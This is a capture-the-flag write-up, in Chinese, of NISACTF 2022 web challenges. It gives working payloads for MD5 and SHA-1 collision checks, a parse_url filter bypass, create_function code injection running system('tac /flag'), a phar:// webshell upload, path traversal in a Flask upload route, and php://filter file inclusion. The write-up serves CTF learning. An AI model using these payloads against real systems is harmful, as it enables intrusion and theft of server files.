---
title: NISACTF 2022
date: 2022-05-15 13:25:40
tags:
- CTF
categories: CTF
my: NISACTF2022-babyupload
---

## checkin

```php
<?php
error_reporting(0);
include "flag.php";
// ‮⁦NISACTF⁩⁦Welcome to
if ("jitanglailo" == $_GET[ahahahaha] &‮⁦+!!⁩⁦& "‮⁦ Flag!⁩⁦N1SACTF" == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) { //tnnd! weishenme b
    echo $FLAG;
}
show_source(__FILE__);
?>
```

拿到题目以为是非常简单的get传参，以为是签到题，直接自信hackbar，复制的时候就感觉很奇怪，把源码放入vscode

![](https://s2.loli.net/2022/05/15/owuefxpMh7s86Bd.png)

果然不是这么简单，存在不可见字符，将不可见字符复制下来，用此[工具](http://www.hiencode.com/url.html)进行URL编码，直接如下构造payload，拿到flag

```
?ahahahaha=jitanglailo&%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6 Flag!%E2%81%A9%E2%81%A6N1SACTF
```

## level-up

只能说这道题非常的折磨

### level 1

进入题目“nothing here”直接F12看见disallow就想到了robots.txt

![](https://s2.loli.net/2022/05/15/RNndus4BU1Te6P3.png)

### level 2

开始代码审计

```php
<?php
//here is level 2
error_reporting(0);
include "str.php";
if (isset($_POST['array1']) && isset($_POST['array2'])){
    $a1 = (string)$_POST['array1'];
    $a2 = (string)$_POST['array2'];
    if ($a1 == $a2){
        die("????");
    }
    if (md5($a1) === md5($a2)){
        echo $level3;
    }
    else{
        die("level 2 failed ...");
    }

}
else{
    show_source(__FILE__);
}
?>
```

这道题md5强碰撞开始想用数组，后面仔细一看禁用了数组，在网上搜资料找到：构造了如下的payload

```
array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

用burp抓包发送

![](https://s2.loli.net/2022/05/15/7I59n6YLOaxKksJ.png)

### level 3

刚开始没有发现什么变化，仔细一看变成了sha强碰撞

同样查资料构造payload

```
array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

以为就此结束，结果还有!

![](https://s2.loli.net/2022/05/15/ChTcxPwzXHJMF6f.png)

### level 4

源码：

```php
<?php
//here is last level
    error_reporting(0);
    include "str.php";
    show_source(__FILE__);

    $str = parse_url($_SERVER['REQUEST_URI']);
    if($str['query'] == ""){
        echo "give me a parameter";
    }
    if(preg_match('/ |_|20|5f|2e|\./',$str['query'])){
        die("blacklist here");
    }
    if($_GET['NI_SA_'] === "txw4ever"){
        die($level5);
    }
    else{
        die("level 4 failed ...");
    }

?>
```

这里正则匹配了"_"如果直接get传参会"blacklist here"

在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将"空格"、'+'、'.'、'[' 转换为下划线，但是用一个特性是可以绕过的，就是当'['提前出现后，后面的点就不会再被转义了

eg：`CTF[SHOW.COM`=>`CTF_SHOW.COM`
这里刚好+号没有被过滤

#### 法1

直接构造payload:

```
?NI+SA+=txw4ever
```

#### 法2

过滤_就用转码 %5F，过滤 5F 不影响 5f

```
?NI%5FSA%5F=txw4ever
```

#### 法三官方:

```
http://1.14.71.254:28563///level_level_4.php?NI_SA_=txw4ever
```

这里是parse_url的解析缺陷

### level 5

好的还有最后一个

```php
<?php
//sorry , here is true last level
//^_^
error_reporting(0);
include "str.php";

$a = $_GET['a'];
$b = $_GET['b'];
if(preg_match('/^[a-z0-9_]*$/isD',$a)){
    show_source(__FILE__);
}
else{
    $a('',$b);
}
```

create_function注入

payload

```
?a=\create_function&b=}system('tac /flag');//
```

![](https://s2.loli.net/2022/05/15/sTZcBmol2A7E9qW.png)

## bingdundun~

点击uploads，GET传参

![](https://nssctf.wdf.ink/img/xmj/image-20220518235012721.png)

看见压缩包，马上想到`phar://`协议，直接上传压缩后的木马文件

![](https://nssctf.wdf.ink/img/xmj/image-20220518235809605.png)

解析成功

![](https://nssctf.wdf.ink/img/xmj/image-20220519000238960.png)

上传成功，接下来直接去连接`http://1.14.71.254:28899/?bingdundun=phar:///var/www/html/0202dde75672643a515696e8c70c704b.zip/1.php`离谱的是返回数据为空

仔细审计后，发现点击uploads后是`?bingdundun=upload`没有`.php`改为index

<img src="https://nssctf.wdf.ink/img/xmj/image-20220519000523198.png" alt="image-20220519000523198" style="zoom:50%;" />

可能是自动添加`.php`后缀，去掉再连接

`http://1.14.71.254:28899/?bingdundun=phar:///var/www/html/0202dde75672643a515696e8c70c704b.zip/1`

果然自动添加，直接去根目录拿到flag

![](https://nssctf.wdf.ink/img/xmj/image-20220519000051637.png)

## babyserialize

源码：

```php
<?php
include "waf.php";
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }

    function __call($from,$val){
        $this->fun=$val[0];
    }

    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}

class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}

class Ilovetxw{
    public $huang;
    public $su;

    public function __call($fun1,$arg){
        $this->huang->fun=$arg[0];
    }

    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';

    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}

if(isset($_GET['ser'])){
    @unserialize($_GET['ser']);
}else{
    highlight_file(__FILE__);
}

//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
?>
```

这么多代码，看着就头大

## babyupload

提示上传一个图片，先上传一个1.jpg文件，看看有没有路径，然后让人迷惑的事情发生了

![](https://s2.loli.net/2022/05/15/RWSLh4DkQCPAMwa.png)

![](https://s2.loli.net/2022/05/15/th9VabqmJnezxKX.png)

名字出错，一定是在后台有检测，试图寻找源码直接F12，访问/source

下载了源码  一看python  开始代码审计

```python
from flask import Flask, request, redirect, g, send_from_directory
import sqlite3
import os
import uuid

app = Flask(__name__)

SCHEMA = """CREATE TABLE files (
id text primary key,
path text
);
"""


def db():
    g_db = getattr(g, '_database', None)
    if g_db is None:
        g_db = g._database = sqlite3.connect("database.db")
    return g_db


@app.before_first_request
def setup():
    os.remove("database.db")
    cur = db().cursor()
    cur.executescript(SCHEMA)


@app.route('/')
def hello_world():
    return """<!DOCTYPE html>
<html>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="file">
    <input type="submit" value="Upload File" name="submit">
</form>
<!-- /source -->
</body>
</html>"""


@app.route('/source')
def source():
    return send_from_directory(directory="/var/www/html/", path="www.zip", as_attachment=True)


@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect('/')
    file = request.files['file']
    if "." in file.filename:
        return "Bad filename!", 403
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().hex
    try:
        cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))
    except sqlite3.IntegrityError:
        return "Duplicate file"
    conn.commit()

    file.save('uploads/' + file.filename)
    return redirect('/file/' + uid)


@app.route('/file/<id>')
def file(id):
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", (id,))
    res = cur.fetchone()
    if res is None:
        return "File not found", 404

    # print(res[0])

    with open(os.path.join("uploads/", res[0]), "r") as f:
        return f.read()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```

这个地方，文件名里有"."就返回"Bad filename"

![](https://s2.loli.net/2022/05/15/ugmHorjQbVXIT15.png)

用burp抓包重新上传一个文件，将文件名里的后缀去掉就上传成功了，试图直接改名flag，一看302重定向，跟踪重定向，500状态码，果然不可能这么简单

![](https://s2.loli.net/2022/05/15/I2nclap8q7U1xY9.png)



```python
    with open(os.path.join("uploads/", res[0]), "r") as f:
        return f.read()
```

继续代码审计，虽然python还没有系统学习但是，知道这个地方是拼接，在网上找到了这里包含了漏洞

![](https://s2.loli.net/2022/05/15/6lzK9HQbUYfERSp.png)

只需要将res[0]为/flag就能实现此漏洞，将filename="/flag"

追踪重定向拿到flag

![](https://s2.loli.net/2022/05/15/k8TZ3nMzheiYV5N.png)



## easyssrf

拿到题目

![](https://nssctf.wdf.ink/img/xmj/image-20220519091008540.png)

直接试试flag

![](https://nssctf.wdf.ink/img/xmj/image-20220519091038836.png)

文件包含，用`file:///fl4g`读取文件

![](https://nssctf.wdf.ink/img/xmj/image-20220519091206269.png)

直接访问

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
```

明显的LFI，直接明说了flag在`/flag`里，构造payload

```
file=php://filter/read=convert.base64-encode/resource=/flag
```



## is secret

## popchains

## middlerce

## hardsql

## join_us

## midlevel
